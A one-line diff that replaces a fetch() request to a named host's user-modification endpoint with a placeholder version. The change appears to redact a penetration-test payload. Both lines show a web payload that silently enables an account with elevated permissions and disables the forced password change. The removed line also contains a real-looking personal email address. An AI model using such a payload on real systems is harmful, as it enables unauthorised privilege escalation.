@@ -1,1 +1,1 @@
-fetch("https://azrwe1islap1.global.lpl.top/ISLA-pentest/Settings-users-modify.cfm?user=pentest_security_officer&name=Pentest+Security+Officer&email=tara.owens%40bridewellconsulting.com&enabled=true&region=All&perm=1&mustchangepassword=false&id=376")
+fetch("https://blah/modify.cfm?user=blah&name=blah&email=tmo@tmo.com&enabled=true&region=All&perm=1&mustchangepassword=false&id=376")
